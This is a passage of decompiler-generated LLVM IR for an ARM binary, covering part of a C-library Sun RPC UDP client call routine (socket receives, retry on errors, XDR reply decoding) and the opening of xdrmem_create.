  %v12_3263c = add i32 %v0_32638, 16
  store i32 %v2_3263c, i32* %stack_var_-164, align 4
  store i32 %v13_32644, i32* @lr, align 4
  %v1_32648 = inttoptr i32 %v12_3263c to i32*
  %v2_32648 = load i32, i32* %v1_32648, align 4
  store i32 %v2_32648, i32* %r0.global-to-local, align 4
  %v3_32648 = add i32 %v0_32638, 20
  %v4_32648 = inttoptr i32 %v3_32648 to i32*
  %v5_32648 = load i32, i32* %v4_32648, align 4
  store i32 %v5_32648, i32* %r1.global-to-local, align 4
  %v6_32648 = add i32 %v0_32638, 24
  %v7_32648 = inttoptr i32 %v6_32648 to i32*
  %v8_32648 = load i32, i32* %v7_32648, align 4
  store i32 %v8_32648, i32* %r2.global-to-local, align 4
  %v9_32648 = add i32 %v0_32638, 28
  %v10_32648 = inttoptr i32 %v9_32648 to i32*
  %v11_32648 = load i32, i32* %v10_32648, align 4
  store i32 %v11_32648, i32* @r3, align 4
  %v4_3264c = trunc i32 %v2_32648 to i16
  store i16 %v4_3264c, i16* %stack_var_-148, align 2
  %v0_32650 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_32650, i32* %r0.global-to-local, align 4
  store i32 35091, i32* %r1.global-to-local, align 4
  store i32 %v2_32630, i32* %r2.global-to-local, align 4
  %v3_3265c = call i32 @ioctl(i32 %v0_32650, i32 35091, i32 %v2_32630)
  store i32 %v3_3265c, i32* %r0.global-to-local, align 4
  %v1_32660 = icmp slt i32 %v3_3265c, 0
  br i1 %v1_32660, label %dec_label_pc_32a38, label %dec_label_pc_32668

dec_label_pc_32668:                               ; preds = %dec_label_pc_32638
  %v3_32668 = load i16, i16* %stack_var_-148, align 2
  %v4_32668 = sext i16 %v3_32668 to i32
  store i32 %v4_32668, i32* %r3.global-to-local, align 4
  %v1_3266c = urem i32 %v4_32668, 2
  %v2_3266c = icmp eq i32 %v1_3266c, 0
  %v0_32680.pre = load i32, i32* @r4, align 4
  br i1 %v2_3266c, label %dec_label_pc_32680, label %dec_label_pc_32674

dec_label_pc_32674:                               ; preds = %dec_label_pc_32668
  %v1_32674 = add i32 %v0_32680.pre, 16
  %v2_32674 = inttoptr i32 %v1_32674 to i16*
  %v3_32674 = load i16, i16* %v2_32674, align 2
  %v4_32674 = zext i16 %v3_32674 to i32
  store i32 %v4_32674, i32* %r3.global-to-local, align 4
  %v7_32678 = icmp eq i16 %v3_32674, 2
  br i1 %v7_32678, label %dec_label_pc_32694, label %dec_label_pc_32680

dec_label_pc_32680:                               ; preds = %dec_label_pc_32668, %dec_label_pc_32674
  %v1_32680 = add i32 %v0_32680.pre, 32
  store i32 %v1_32680, i32* @r4, align 4
  %v0_32684.pr = load i32, i32* %r6.global-to-local, align 4
  %v2_32684 = icmp eq i32 %v0_32684.pr, 0
  %v1_32688 = add i32 %v0_32684.pr, -1
  store i32 %v1_32688, i32* %r6.global-to-local, align 4
  br i1 %v2_32684, label %dec_label_pc_32a38, label %dec_label_pc_32638

dec_label_pc_32694:                               ; preds = %dec_label_pc_32674
  %v0_32698 = load i32, i32* @r5, align 4
  %v1_32698 = add i32 %v0_32698, 28
  %v2_32698 = inttoptr i32 %v1_32698 to i32*
  %v3_32698 = load i32, i32* %v2_32698, align 4
  store i32 %v3_32698, i32* %r3.global-to-local, align 4
  %v2_326a0 = add i32 %v3_32698, %stack_var_-9024.2
  store i32 %v2_326a0, i32* %r0.global-to-local, align 4
  %v1_326a8 = add i32 %v0_32698, 32
  %v2_326a8 = inttoptr i32 %v1_326a8 to i32*
  %v3_326a8 = load i32, i32* %v2_326a8, align 4
  store i32 %v3_326a8, i32* %r2.global-to-local, align 4
  store i32 999999, i32* %r1.global-to-local, align 4
  %v2_326b8 = add i32 %v3_326a8, %stack_var_-9036.2
  store i32 %v2_326b8, i32* %r3.global-to-local, align 4
  store i32 %v2_326b8, i32* %r0.global-to-local, align 4
  %v8_326fc38 = icmp sgt i32 %v2_326b8, 999999
  br i1 %v8_326fc38, label %dec_label_pc_326c4.preheader, label %dec_label_pc_32700

dec_label_pc_326c4.preheader:                     ; preds = %dec_label_pc_32694
  %tmp138 = add i32 %stack_var_-9036.2, -1000000
  %tmp139 = add i32 %tmp138, %v3_326a8
  %tmp140 = udiv i32 %tmp139, 1000000
  %tmp142 = add i32 %stack_var_-9024.2, 1
  %tmp143 = add i32 %tmp142, %v3_32698
  %tmp145 = add i32 %v2_326a0, %tmp140
  %tmp146 = add i32 %tmp143, %tmp140
  %tmp149 = mul i32 %tmp140, -1000000
  %tmp147 = add i32 %tmp139, %tmp149
  store i32 %v2_3231c, i32* %r2.global-to-local, align 4
  store i32 %tmp145, i32* %r3.global-to-local, align 4
  store i32 %tmp147, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32700

dec_label_pc_32700:                               ; preds = %dec_label_pc_326c4.preheader, %dec_label_pc_32694
  %stack_var_-9024.3.lcssa = phi i32 [ %tmp146, %dec_label_pc_326c4.preheader ], [ %v2_326a0, %dec_label_pc_32694 ]
  %v0_32720 = phi i32 [ %tmp147, %dec_label_pc_326c4.preheader ], [ %v2_326b8, %dec_label_pc_32694 ]
  store i32 %stack_var_-9028.0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-9024.3.lcssa, i32* %r2.global-to-local, align 4
  %v5_32710 = icmp slt i32 %stack_var_-9024.3.lcssa, %stack_var_-9028.0
  br i1 %v5_32710, label %dec_label_pc_32520, label %dec_label_pc_32714

dec_label_pc_32714:                               ; preds = %dec_label_pc_32700
  %v9_3270c = icmp eq i32 %stack_var_-9024.3.lcssa, %stack_var_-9028.0
  br i1 %v9_3270c, label %dec_label_pc_32718, label %dec_label_pc_3272c

dec_label_pc_32718:                               ; preds = %dec_label_pc_32714
  store i32 %tmp80, i32* %r2.global-to-local, align 4
  %v5_32724 = icmp slt i32 %v0_32720, %tmp80
  br i1 %v5_32724, label %dec_label_pc_32520, label %dec_label_pc_3272c

dec_label_pc_3272c:                               ; preds = %dec_label_pc_32578, %dec_label_pc_32718, %dec_label_pc_32714, %dec_label_pc_3245c, %dec_label_pc_324b0, %dec_label_pc_324dc
  %storemerge = phi i32 [ 1, %dec_label_pc_324dc ], [ 1, %dec_label_pc_324b0 ], [ 1, %dec_label_pc_3245c ], [ 5, %dec_label_pc_32714 ], [ 5, %dec_label_pc_32718 ], [ 5, %dec_label_pc_32578 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_328fc

dec_label_pc_32744:                               ; preds = %dec_label_pc_325f4
  store i32 %v4_32744, i32* %r3.global-to-local, align 4
  br i1 %v2_32748, label %dec_label_pc_32894, label %dec_label_pc_32750

dec_label_pc_32750:                               ; preds = %dec_label_pc_32744
  store i32 %v2_323d0, i32* %r0.global-to-local, align 4
  store i32 %v2_323d0, i32* %v4_32764, align 4
  store i32 %v2_323bc, i32* @r7, align 4
  store i32 16, i32* %stack_var_-9008, align 4
  %v0_3277c = load i32, i32* @r8, align 4
  %v1_3277c = load i32, i32* @sp, align 4
  %v2_3277c = sub i32 %v1_3277c, %v0_3277c
  %v1_32794 = add i32 %v2_3277c, 264
  store i32 %v1_32794, i32* %r6.global-to-local, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i32 8192, i32* %r2.global-to-local, align 4
  store i32 %v2_32444, i32* %r1.global-to-local, align 4
  %v0_327bc = load i32, i32* @r5, align 4
  %v1_327bc = inttoptr i32 %v0_327bc to i32*
  %v2_327bc = load i32, i32* %v1_327bc, align 4
  store i32 %v2_327bc, i32* %r0.global-to-local, align 4
  %v3_327c0 = call i32 @__libc_recvmsg(i32 %v2_327bc, i32 %v2_32444, i32 8192)
  store i32 %v3_327c0, i32* %r0.global-to-local, align 4
  %v1_327c4 = icmp slt i32 %v3_327c0, 0
  br i1 %v1_327c4, label %dec_label_pc_32894, label %dec_label_pc_327cc

dec_label_pc_327cc:                               ; preds = %dec_label_pc_32750
  %v0_327cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_327cc, i32* %r0.global-to-local, align 4
  %v0_327d0 = load i32, i32* @r5, align 4
  %v1_327d0 = add i32 %v0_327d0, 88
  %v2_327d0 = inttoptr i32 %v1_327d0 to i32*
  %v3_327d0 = load i32, i32* %v2_327d0, align 4
  store i32 %v3_327d0, i32* @r1, align 4
  store i32 %v3_327c0, i32* %r2.global-to-local, align 4
  %v3_327d8 = inttoptr i32 %v0_327cc to i8*
  %v4_327d8 = call i32 @bcmp(i8* %v3_327d8, i32 %v3_327d0, i32 %v3_327c0)
  store i32 %v4_327d8, i32* %r0.global-to-local, align 4
  store i32 %v4_327d8, i32* %r6.global-to-local, align 4
  %v2_327dc = icmp eq i32 %v4_327d8, 0
  br i1 %v2_327dc, label %dec_label_pc_327e4, label %dec_label_pc_32894

dec_label_pc_327e4:                               ; preds = %dec_label_pc_327cc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_32894

dec_label_pc_32894:                               ; preds = %dec_label_pc_327e4, %dec_label_pc_327cc, %dec_label_pc_32750, %dec_label_pc_32744
  store i32 16, i32* @r7, align 4
  %v0_32898 = load i32, i32* @r5, align 4
  %v1_32898 = add i32 %v0_32898, 96
  store i32 %v1_32898, i32* %r6.global-to-local, align 4
  store i32 %v2_3289c, i32* @r4, align 4
  br label %dec_label_pc_328a0

dec_label_pc_328a0:                               ; preds = %dec_label_pc_328d0.dec_label_pc_328a0_crit_edge, %dec_label_pc_32894
  %v0_328b4 = phi i32 [ %v0_328b4.pre, %dec_label_pc_328d0.dec_label_pc_328a0_crit_edge ], [ %v1_32898, %dec_label_pc_32894 ]
  %v0_328ac = phi i32 [ %v0_328ac.pre, %dec_label_pc_328d0.dec_label_pc_328a0_crit_edge ], [ %v0_32898, %dec_label_pc_32894 ]
  %v0_328a0 = phi i32 [ %v0_328a0.pre, %dec_label_pc_328d0.dec_label_pc_328a0_crit_edge ], [ 16, %dec_label_pc_32894 ]
  store i32 %v0_328a0, i32* %stack_var_-52, align 4
  %v1_328ac = inttoptr i32 %v0_328ac to i32*
  %v2_328ac = load i32, i32* %v1_328ac, align 4
  store i32 %v2_328ac, i32* %r0.global-to-local, align 4
  %v1_328b0 = add i32 %v0_328ac, 92
  %v2_328b0 = inttoptr i32 %v1_328b0 to i32*
  %v3_328b0 = load i32, i32* %v2_328b0, align 4
  store i32 %v3_328b0, i32* %r2.global-to-local, align 4
  store i32 %v0_328b4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_328c4 = call i32 @__libc_recvfrom(i32 %v2_328ac, i32 %v0_328b4, i32 %v3_328b0, i32 0, i32 %v2_32430, i32 %v2_3289c)
  store i32 %v6_328c4, i32* %r0.global-to-local, align 4
  %v1_328c8 = icmp slt i32 %v6_328c4, 0
  br i1 %v1_328c8, label %dec_label_pc_328d0, label %dec_label_pc_32904

dec_label_pc_328d0:                               ; preds = %dec_label_pc_328a0
  %v0_328d0 = call i32 @__GI___errno_location()
  store i32 %v0_328d0, i32* %r0.global-to-local, align 4
  %v1_328d4 = inttoptr i32 %v0_328d0 to i32*
  %v2_328d4 = load i32, i32* %v1_328d4, align 4
  store i32 %v2_328d4, i32* %r3.global-to-local, align 4
  %v7_328d8 = icmp eq i32 %v2_328d4, 4
  br i1 %v7_328d8, label %dec_label_pc_328d0.dec_label_pc_328a0_crit_edge, label %dec_label_pc_328e0

dec_label_pc_328d0.dec_label_pc_328a0_crit_edge:  ; preds = %dec_label_pc_328d0
  %v0_328a0.pre = load i32, i32* @r7, align 4
  %v0_328ac.pre = load i32, i32* @r5, align 4
  %v0_328b4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_328a0

dec_label_pc_328e0:                               ; preds = %dec_label_pc_328d0
  %v0_328e0 = call i32 @__GI___errno_location()
  store i32 %v0_328e0, i32* %r0.global-to-local, align 4
  %v1_328e4 = inttoptr i32 %v0_328e0 to i32*
  %v2_328e4 = load i32, i32* %v1_328e4, align 4
  store i32 %v2_328e4, i32* %r2.global-to-local, align 4
  %v7_328e8 = icmp eq i32 %v2_328e4, 11
  br i1 %v7_328e8, label %dec_label_pc_325d8, label %dec_label_pc_328f4

dec_label_pc_328ec:                               ; preds = %dec_label_pc_325d8
  %v0_32734 = call i32 @__GI___errno_location()
  store i32 %v0_32734, i32* %r0.global-to-local, align 4
  %v1_32738 = inttoptr i32 %v0_32734 to i32*
  %v2_32738 = load i32, i32* %v1_32738, align 4
  store i32 %v2_32738, i32* %r2.global-to-local, align 4
  %v7_3273c = icmp eq i32 %v2_32738, 4
  br i1 %v7_3273c, label %dec_label_pc_325d8, label %dec_label_pc_328f4

dec_label_pc_328f4:                               ; preds = %dec_label_pc_328e0, %dec_label_pc_328ec, %dec_label_pc_32558
  %v0_328f4 = phi i32 [ %v2_3255c, %dec_label_pc_32558 ], [ %v2_328e4, %dec_label_pc_328e0 ], [ %v2_32738, %dec_label_pc_328ec ]
  %storemerge4 = phi i32 [ 3, %dec_label_pc_32558 ], [ 4, %dec_label_pc_328e0 ], [ 4, %dec_label_pc_328ec ]
  store i32 %storemerge4, i32* %r3.global-to-local, align 4
  %v1_328f4 = load i32, i32* @r5, align 4
  %v2_328f4 = add i32 %v1_328f4, 48
  %v3_328f4 = inttoptr i32 %v2_328f4 to i32*
  store i32 %v0_328f4, i32* %v3_328f4, align 4
  %v0_328f8 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_328fc

dec_label_pc_328fc:                               ; preds = %dec_label_pc_3272c, %dec_label_pc_328f4
  %v0_328fc = phi i32 [ %storemerge, %dec_label_pc_3272c ], [ %v0_328f8, %dec_label_pc_328f4 ]
  store i32 %v0_328fc, i32* %r0.global-to-local, align 4
  %v1_328fc = load i32, i32* @r5, align 4
  %v2_328fc = add i32 %v1_328fc, 44
  %v3_328fc = inttoptr i32 %v2_328fc to i32*
  store i32 %v0_328fc, i32* %v3_328fc, align 4
  %v1_32a4c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32a44

dec_label_pc_32904:                               ; preds = %dec_label_pc_328a0
  %v7_32908 = icmp slt i32 %v6_328c4, 4
  br i1 %v7_32908, label %dec_label_pc_325d8, label %dec_label_pc_3290c

dec_label_pc_3290c:                               ; preds = %dec_label_pc_32904
  store i32 %arg3, i32* %r1.global-to-local, align 4
  br i1 %v2_32450, label %dec_label_pc_32930, label %dec_label_pc_3291c

dec_label_pc_3291c:                               ; preds = %dec_label_pc_3290c
  %v0_3291c = load i32, i32* @r5, align 4
  %v1_3291c = add i32 %v0_3291c, 88
  %v2_3291c = inttoptr i32 %v1_3291c to i32*
  %v3_3291c = load i32, i32* %v2_3291c, align 4
  store i32 %v3_3291c, i32* %r3.global-to-local, align 4
  %v1_32920 = inttoptr i32 %v3_3291c to i32*
  %v2_32920 = load i32, i32* %v1_32920, align 4
  store i32 %v2_32920, i32* %r2.global-to-local, align 4
  %v1_32924 = add i32 %v0_3291c, 96
  %v2_32924 = inttoptr i32 %v1_32924 to i32*
  %v3_32924 = load i32, i32* %v2_32924, align 4
  store i32 %v3_32924, i32* %r3.global-to-local, align 4
  %v9_32928 = icmp eq i32 %v3_32924, %v2_32920
  br i1 %v9_32928, label %dec_label_pc_32930, label %dec_label_pc_325d8

dec_label_pc_32930:                               ; preds = %dec_label_pc_3291c, %dec_label_pc_3290c
  store i32 %v2_32930, i32* @r4, align 4
  %v0_32934 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_32934, i32* %r1.global-to-local, align 4
  store i32 %v6_328c4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v2_32930, i32* %r0.global-to-local, align 4
  store i32 %v2_32944, i32* @r6, align 4
  %v10_32948 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-132, i32 %v0_32934, i32 %v6_328c4, i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_32930, i32* %r0.global-to-local, align 4
  store i32 %v2_32944, i32* %r1.global-to-local, align 4
  %v2_32954 = call i32 @__GI_xdr_replymsg(i32 %v2_32930, i32 %v2_32944)
  store i32 %v2_32954, i32* %r0.global-to-local, align 4
  %v2_32958 = icmp eq i32 %v2_32954, 0
  br i1 %v2_32958, label %dec_label_pc_32a28, label %dec_label_pc_32960

dec_label_pc_32960:                               ; preds = %dec_label_pc_32930
  store i32 %v2_32944, i32* %r0.global-to-local, align 4
  %v0_32964 = load i32, i32* @r5, align 4
  %v1_32964 = add i32 %v0_32964, 44
  store i32 %v1_32964, i32* %r1.global-to-local, align 4
  %v2_32968 = inttoptr i32 %v1_32964 to i32*
  %v3_32968 = call i32 @__GI__seterr_reply(i32 %v2_32944, i32* %v2_32968)
  store i32 %v3_32968, i32* %r0.global-to-local, align 4
  %v0_3296c = load i32, i32* @r5, align 4
  %v1_3296c = add i32 %v0_3296c, 44
  %v2_3296c = inttoptr i32 %v1_3296c to i32*
  %v3_3296c = load i32, i32* %v2_3296c, align 4
  store i32 %v3_3296c, i32* %r3.global-to-local, align 4
  %v2_32970 = icmp eq i32 %v3_3296c, 0
  br i1 %v2_32970, label %dec_label_pc_32978, label %dec_label_pc_329d8

dec_label_pc_32978:                               ; preds = %dec_label_pc_32960
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v2_32980 = load i32, i32* %arg1, align 4
  store i32 %v2_32980, i32* %r3.global-to-local, align 4
  store i32 %v2_32980, i32* %r0.global-to-local, align 4
  store i32 %v2_3240c, i32* %r1.global-to-local, align 4
  %v1_32990 = add i32 %v2_32980, 32
  %v2_32990 = inttoptr i32 %v1_32990 to i32*
  %v3_32990 = load i32, i32* %v2_32990, align 4
  store i32 %v3_32990, i32* %r3.global-to-local, align 4
  %v1_32994 = add i32 %v3_32990, 8
  %v2_32994 = inttoptr i32 %v1_32994 to i32*
  %v3_32994 = load i32, i32* %v2_32994, align 4
  store i32 207264, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_32994)
  %v0_329a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_329a0 = icmp eq i32 %v0_329a0, 0
  br i1 %v2_329a0, label %bb133, label %.thread23

bb133:                                            ; preds = %dec_label_pc_32978
  %v2_329a8 = load i32, i32* @r5, align 4
  %v3_329a8 = add i32 %v2_329a8, 44
  %v4_329a8 = inttoptr i32 %v3_329a8 to i32*
  store i32 7, i32* %v4_329a8, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_329b0 = load i32, i32* @r5, align 4
  %v3_329b0 = add i32 %v2_329b0, 48
  %v4_329b0 = inttoptr i32 %v3_329b0 to i32*
  store i32 6, i32* %v4_329b0, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_32978, %bb133
  store i32 %tmp60, i32* %r3.global-to-local, align 4
  %v2_329b8 = icmp eq i32 %tmp60, 0
  br i1 %v2_329b8, label %dec_label_pc_32a30, label %dec_label_pc_329c0

dec_label_pc_329c0:                               ; preds = %.thread23
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_329c4 = load i32, i32* @r5, align 4
  %v2_329c4 = add i32 %v1_329c4, 56
  %v3_329c4 = inttoptr i32 %v2_329c4 to i32*
  store i32 2, i32* %v3_329c4, align 4
  %v0_329c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_329c8, i32* @r0, align 4
  store i32 %v2_3240c, i32* @r1, align 4
  %v0_329d0 = call i32 @xdr_opaque_auth()
  store i32 %v0_329d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32a30

dec_label_pc_329d8:                               ; preds = %dec_label_pc_32960
  store i32 %stack_var_-9040.0, i32* %r3.global-to-local, align 4
  %tmp134 = icmp slt i32 %stack_var_-9040.0, 1
  br i1 %tmp134, label %dec_label_pc_32a30, label %dec_label_pc_329e8

dec_label_pc_329e8:                               ; preds = %dec_label_pc_329d8
  %v2_329f0 = load i32, i32* %arg1, align 4
  store i32 %v2_329f0, i32* %r3.global-to-local, align 4
  store i32 %v2_329f0, i32* %r0.global-to-local, align 4
  %v1_329f8 = add i32 %v2_329f0, 32
  %v2_329f8 = inttoptr i32 %v1_329f8 to i32*
  %v3_329f8 = load i32, i32* %v2_329f8, align 4
  store i32 %v3_329f8, i32* %r3.global-to-local, align 4
  %v1_329fc = add i32 %v3_329f8, 12
  %v2_329fc = inttoptr i32 %v1_329fc to i32*
  %v3_329fc = load i32, i32* %v2_329fc, align 4
  store i32 207368, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_329fc)
  %v0_32a08 = load i32, i32* %r0.global-to-local, align 4
  %v2_32a08 = icmp eq i32 %v0_32a08, 0
  br i1 %v2_32a08, label %dec_label_pc_32a30, label %dec_label_pc_32a10

dec_label_pc_32a10:                               ; preds = %dec_label_pc_329e8
  %v1_32a18 = add i32 %stack_var_-9040.0, -1
  store i32 %v1_32a18, i32* %r1.global-to-local, align 4
  store i32 %v2_3231c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32448

dec_label_pc_32a28:                               ; preds = %dec_label_pc_32930
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_32a2c = load i32, i32* @r5, align 4
  %v2_32a2c = add i32 %v1_32a2c, 44
  %v3_32a2c = inttoptr i32 %v2_32a2c to i32*
  store i32 2, i32* %v3_32a2c, align 4
  br label %dec_label_pc_32a30

dec_label_pc_32a30:                               ; preds = %dec_label_pc_329e8, %dec_label_pc_329d8, %.thread23, %dec_label_pc_329c0, %dec_label_pc_32a28
  %v0_32a30 = load i32, i32* @r5, align 4
  %v1_32a30 = add i32 %v0_32a30, 44
  %v2_32a30 = inttoptr i32 %v1_32a30 to i32*
  %v3_32a30 = load i32, i32* %v2_32a30, align 4
  store i32 %v3_32a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32a44

dec_label_pc_32a38:                               ; preds = %dec_label_pc_325fc, %dec_label_pc_32624, %dec_label_pc_32638, %dec_label_pc_32680
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_32a3c = load i32, i32* @r5, align 4
  %v2_32a3c = add i32 %v1_32a3c, 44
  %v3_32a3c = inttoptr i32 %v2_32a3c to i32*
  store i32 4, i32* %v3_32a3c, align 4
  %v0_32a40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_32a40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32a44

dec_label_pc_32a44:                               ; preds = %dec_label_pc_32a30, %dec_label_pc_328fc, %dec_label_pc_32a38
  %v1_32a4c = phi i32 [ %v3_32a30, %dec_label_pc_32a30 ], [ %v1_32a4c.pre, %dec_label_pc_328fc ], [ %v0_32a40, %dec_label_pc_32a38 ]
  store i32 %v9_3230c, i32* %r6.global-to-local, align 4
  store i32 %v15_3230c, i32* %r8.global-to-local, align 4
  ret i32 %v1_32a4c

; uselistorder directives
  uselistorder i32 %v1_32a18, { 1, 0 }
  uselistorder i32 %v6_328c4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_328ac, { 1, 0 }
  uselistorder i32 %v0_328b4, { 1, 0 }
  uselistorder i32 %v3_327c0, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-9024.3.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %tmp147, { 1, 0 }
  uselistorder i32 %v2_326a0, { 1, 0, 2 }
  uselistorder i32 %v0_32698, { 2, 3, 1, 0 }
  uselistorder i32 %v1_32680, { 1, 0 }
  uselistorder i32 %v0_32638, { 7, 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v3_325e8, { 1, 0, 2 }
  uselistorder i32 %v4_32594, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-9048.2, { 4, 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-9048.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_32534, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-9040.0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-9036.0, { 1, 0 }
  uselistorder i32 %stack_var_-9024.0, { 1, 0 }
  uselistorder i32 %v2_32944, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_32930, { 1, 0, 2, 3 }
  uselistorder i32 %v2_32630, { 1, 0, 2 }
  uselistorder i32 %v4_32744, { 1, 0 }
  uselistorder i32 %v2_32444, { 3, 2, 0, 1 }
  uselistorder i32 %v2_32420, { 1, 0, 2 }
  uselistorder i32 %v2_3240c, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v2_323d0, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-9028.0, { 4, 5, 3, 1, 0, 2 }
  uselistorder i32 %v3_3235c, { 1, 0, 2 }
  uselistorder i32 %v3_32338, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_3231c, { 7, 2, 8, 9, 10, 6, 4, 5, 11, 0, 3, 1, 12, 13 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i8** %stack_var_-76, { 2, 1, 0 }
  uselistorder i16* %stack_var_-148, { 2, 1, 0 }
  uselistorder i32 %tmp80, { 3, 2, 0, 1 }
  uselistorder i32 %tmp60, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 2, 3, 20, 21, 22, 23, 24, 0, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 32, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 7, 10, 8, 9, 12, 11, 13, 15, 14, 25, 26, 28, 16, 17, 19, 18, 21, 20, 24, 22, 23, 2, 58, 27, 32, 29, 30, 31, 34, 33, 40, 35, 36, 37, 38, 39, 41, 56, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 57, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 29, 32, 0, 1, 31, 3, 7, 4, 8, 5, 9, 6, 10, 11, 12, 20, 21, 19, 22, 23, 24, 25, 26, 27, 14, 15, 16, 17, 13, 18, 2, 28, 30 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 264, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32* @sp, { 26, 41, 39, 40, 71, 68, 3, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 2, 72, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 42, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 0, 66, 1, 67, 69, 70, 38 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 12, 11, 2, 1, 0, 10, 9, 8, 7, 6, 3, 5, 4 }
  uselistorder i32 35090, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_poll, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 5, 6, 7, 8, 20, 21, 19, 14, 15, 16, 17, 1, 3, 4, 2, 0, 18, 9, 10, 11, 12, 13 }
  uselistorder i32 80, { 10, 18, 11, 12, 13, 1, 2, 0, 3, 19, 20, 21, 4, 17, 14, 5, 6, 7, 15, 8, 16, 9 }
  uselistorder i32 56, { 7, 8, 25, 9, 10, 27, 20, 12, 13, 14, 15, 19, 6, 0, 3, 22, 26, 23, 21, 18, 28, 16, 1, 24, 17, 29, 30, 31, 11, 4, 5, 2 }
  uselistorder i32 1000, { 0, 1, 4, 6, 2, 7, 5, 3 }
  uselistorder i32 %arg3, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_32a44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_32a38, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_32a30, { 4, 0, 1, 3, 2 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_328fc, { 1, 0 }
  uselistorder label %dec_label_pc_328f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_3272c, { 1, 2, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_32680, { 1, 0 }
  uselistorder label %dec_label_pc_32638, { 1, 0 }
  uselistorder label %dec_label_pc_325d8, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_32588, { 1, 0, 2 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -96), i32* %lr.global-to-local, align 4
  %v2_32a84 = add i32 %tmp, 20
